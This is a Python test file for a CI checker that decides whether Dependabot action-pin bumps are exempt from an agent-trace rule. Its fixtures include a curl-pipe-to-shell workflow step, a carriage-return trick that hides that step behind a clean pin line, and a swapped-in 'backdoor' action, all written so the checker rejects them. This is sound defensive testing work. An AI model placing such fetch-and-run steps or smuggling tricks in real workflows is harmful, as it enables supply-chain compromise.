#!/usr/bin/env python3
"""Blackbox tests for check-agent-trace-requirement.py's dependency-bump exemption.

Runnable standalone: `python3 scripts/ci/tests/test_check_agent_trace_requirement.py`
(no pytest dependency; the repo has no existing Python test framework to match).
Invokes the checker as a subprocess against a temp copy of the real policy/trace
files so the test exercises the exact CLI contract the Agent Behavior workflow
uses, not internals that could drift from it.

Threat model covered by most of the "fails" cases below: a write-access insider
pushing extra commits/diffs onto an otherwise-legitimate Dependabot branch/PR,
not just an untrusted external contributor.
"""
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
SCRIPT = REPO_ROOT / "scripts" / "ci" / "check-agent-trace-requirement.py"
POLICY = REPO_ROOT / ".agents" / "evals" / "risk-policy.json"
STANDING_TRACE = REPO_ROOT / ".agents" / "evals" / "traces" / "dependency-bump.json"

DEPENDABOT_COMMITS = "dependabot[bot] dependabot[bot]\n"
MIXED_COMMITS = "dependabot[bot] dependabot[bot]\nsome-insider some-insider\n"

UPGRADE_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
"""

NON_PIN_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,8 +10,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
+      - run: curl https://example.com/install.sh | sh
"""

# A `\r` embedded mid-line: str.splitlines() (the original bug) would have split this
# into two lines, one of which looks like a clean `uses:` pin and hides the `run:` step
# from a per-line scanner. split("\n") sees it as a single non-matching line either way,
# and the explicit forbidden-char scan catches it regardless.
CR_INJECTION_DIFF = (
    "diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml\n"
    "index 1111111..2222222 100644\n"
    "--- a/.github/workflows/lint.yml\n"
    "+++ b/.github/workflows/lint.yml\n"
    "@@ -10,7 +10,8 @@ jobs:\n"
    "     runs-on: ubuntu-latest\n"
    "     steps:\n"
    "-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0\n"
    "+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0\r"
    "      - run: curl https://example.com/install.sh | sh\n"
)

BINARY_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
Binary files a/.github/workflows/lint.yml and b/.github/workflows/lint.yml differ
"""

RENAME_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint2.yml
similarity index 100%
rename from .github/workflows/lint.yml
rename to .github/workflows/lint2.yml
"""

UNPAIRED_ADD_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,6 +10,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
+      - uses: some/other-action@cccccccccccccccccccccccccccccccccccccccc # v1.0.0
"""

ACTION_SWAP_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: evil/backdoor-action@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
"""

NON_SHA_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@v1.324.0
"""


class RunResult(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="trace-req-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        # Real policy + a real standing trace copied alongside it, so the
        # exemption's `Path(standingTrace).exists()` check resolves relative
        # to the process cwd exactly like it does in CI.
        (self.tmp / ".agents" / "evals" / "traces").mkdir(parents=True)
        shutil.copy(POLICY, self.tmp / ".agents" / "evals" / "risk-policy.json")
        shutil.copy(STANDING_TRACE, self.tmp / ".agents" / "evals" / "traces" / "dependency-bump.json")

    def run_checker(self, changed_files, pr_author=None, workflow_diff=None, commit_authors=None):
        changed_path = self.tmp / "changed.txt"
        changed_path.write_text("\n".join(changed_files) + "\n")
        cmd = [
            sys.executable, str(SCRIPT),
            "--policy", ".agents/evals/risk-policy.json",
            "--changed-files", str(changed_path),
        ]
        if pr_author is not None:
            cmd += ["--pr-author", pr_author]
        if workflow_diff is not None:
            diff_path = self.tmp / "workflow.diff"
            diff_path.write_bytes(workflow_diff.encode("utf-8"))
            cmd += ["--workflow-diff", str(diff_path)]
        if commit_authors is not None:
            commits_path = self.tmp / "commit-authors.txt"
            commits_path.write_text(commit_authors)
            cmd += ["--commit-authors", str(commits_path)]
        proc = subprocess.run(cmd, cwd=self.tmp, capture_output=True, text=True)
        try:
            report = json.loads(proc.stdout)
        except json.JSONDecodeError:
            report = None
        return proc.returncode, report, proc.stderr

    def assert_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commit_authors=DEPENDABOT_COMMITS):
        rc, report, stderr = self.run_checker(
            changed, pr_author="dependabot[bot]", workflow_diff=workflow_diff, commit_authors=commit_authors,
        )
        self.assertEqual(rc, 0, f"expected exempt/pass, got rc={rc} stderr={stderr} report={report}")
        self.assertTrue(report["traceExempt"], report)
        return report

    def assert_not_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commit_authors=DEPENDABOT_COMMITS, pr_author="dependabot[bot]"):
        rc, report, stderr = self.run_checker(
            changed, pr_author=pr_author, workflow_diff=workflow_diff, commit_authors=commit_authors,
        )
        self.assertEqual(rc, 1, f"expected a failure, got rc={rc} stderr={stderr} report={report}")
        self.assertFalse(report["traceExempt"], report)
        return report

    # --- baseline behaviors (kept from the original PR) ---------------------------------

    def test_dependabot_uses_only_bump_passes(self):
        report = self.assert_exempt([".github/workflows/lint.yml"])
        self.assertTrue(report["traceRequired"])
        self.assertFalse(report["traceChanged"])

    def test_dependabot_bump_with_run_line_edit_fails(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=NON_PIN_DIFF)
        self.assertIn("non-`uses:`", report["traceExemptionDetail"])

    def test_dependabot_bump_missing_workflow_diff_fails_closed(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
            workflow_diff=None, commit_authors=DEPENDABOT_COMMITS,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])

    def test_dependabot_touching_disallowed_file_fails(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml", "scripts/ci/check-mutable-inputs.py"])
        self.assertIn("outside dependency-bump allowlist", report["traceExemptionDetail"])

    def test_human_workflow_edit_without_trace_fails(self):
        report = self.assert_not_exempt(
            [".github/workflows/lint.yml"], workflow_diff=NON_PIN_DIFF, pr_author="a-human-contributor",
            commit_authors="a-human-contributor a-human-contributor\n",
        )
        self.assertNotIn("uses:", report.get("traceExemptionDetail") or "")  # rejected before ever reaching diff parsing

    def test_human_with_trace_passes(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml", ".agents/evals/traces/2026-09-human-change.json"],
            pr_author="a-human-contributor",
        )
        self.assertEqual(rc, 0, stderr)
        self.assertTrue(report["traceChanged"])
        self.assertFalse(report["traceExempt"])

    def test_low_risk_change_never_needs_a_trace_or_exemption(self):
        rc, report, stderr = self.run_checker(["README.md"], pr_author="dependabot[bot]")
        self.assertEqual(rc, 0, stderr)
        self.assertFalse(report["traceRequired"])

    # --- security-review follow-up: line-break / diff-shape smuggling ------------------

    def test_cr_injection_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=CR_INJECTION_DIFF)
        self.assertIn("line-break character", report["traceExemptionDetail"])

    def test_empty_diff_fails_closed(self):
        # Workflow file is listed as changed, but the diff we hand the checker has no
        # matching `diff --git` block for it at all (e.g. a broken/empty capture).
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff="")
        self.assertIn("no parseable diff hunk", report["traceExemptionDetail"])

    def test_binary_diff_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=BINARY_DIFF)
        self.assertIn("disallowed diff marker", report["traceExemptionDetail"])

    def test_rename_diff_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint2.yml"], workflow_diff=RENAME_DIFF)
        self.assertTrue(
            "disallowed diff marker" in report["traceExemptionDetail"]
            or "no parseable diff hunk" in report["traceExemptionDetail"],
            report,
        )

    def test_unpaired_uses_add_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=UNPAIRED_ADD_DIFF)
        self.assertIn("unpaired uses:", report["traceExemptionDetail"])

    def test_action_swap_same_line_different_action_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=ACTION_SWAP_DIFF)
        self.assertIn("unpaired uses:", report["traceExemptionDetail"])

    def test_non_sha_new_ref_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=NON_SHA_DIFF)
        self.assertIn("not a 40-character commit SHA", report["traceExemptionDetail"])

    # --- security-review follow-up: commit provenance (insider threat model) -----------

    def test_human_committed_commit_on_dependabot_pr_is_rejected(self):
        # PR author metadata says dependabot[bot] and the diff is a clean pin bump, but one
        # of the actual commits on the branch was authored/committed by someone else -- e.g.
        # a write-access insider pushed an extra commit onto the Dependabot branch.
        report = self.assert_not_exempt([".github/workflows/lint.yml"], commit_authors=MIXED_COMMITS)
        self.assertIn("commit not authored and committed by a trusted login", report["traceExemptionDetail"])

    def test_missing_commit_authors_fails_closed(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
            workflow_diff=UPGRADE_DIFF, commit_authors=None,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])
        self.assertIn("commit author list unavailable", report["traceExemptionDetail"])


if __name__ == "__main__":
    unittest.main()
